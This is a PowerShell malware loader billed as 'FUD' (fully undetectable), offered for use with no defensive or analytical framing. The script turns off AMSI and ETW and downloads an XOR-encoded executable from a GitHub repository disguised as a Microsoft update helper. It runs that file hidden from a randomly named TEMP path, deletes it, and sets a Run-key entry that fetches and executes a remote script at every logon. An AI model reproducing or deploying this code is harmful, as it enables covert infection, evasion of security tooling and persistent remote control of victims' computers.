# VOID-9 SIMPLE RELIABLE FUD LOADER 2026
$ErrorActionPreference = 'SilentlyContinue'

# Bypass
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$etw = [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance')
$etw.SetValue([System.Diagnostics.Eventing.EventProvider]::new([Guid]::NewGuid()),$false)

try {
    $url = "https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/winverify.exe"
    
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $data = $wc.DownloadData($url)

    # XOR decrypt
    for($i = 0; $i -lt $data.Length; $i++) {
        $data[$i] = $data[$i] -bxor 0x69
    }

    # Random name
    $rand = Get-Random -Maximum 999999999
    $exePath = "$env:TEMP\winupdate_$rand.exe"

    [IO.File]::WriteAllBytes($exePath, $data)

    # Run hidden
    Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru | Out-Null

    # Self delete after 8 seconds
    Start-Sleep -Seconds 8
    Remove-Item $exePath -Force -ErrorAction SilentlyContinue

    # Persistence
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdate" -Value "powershell -nop -w hidden -c `"irm https://raw.githubusercontent.com/s7xeyes/Microsoft-Update-Helper/main/activate.ps1 | iex`"" -Force

    exit
}
catch { exit }
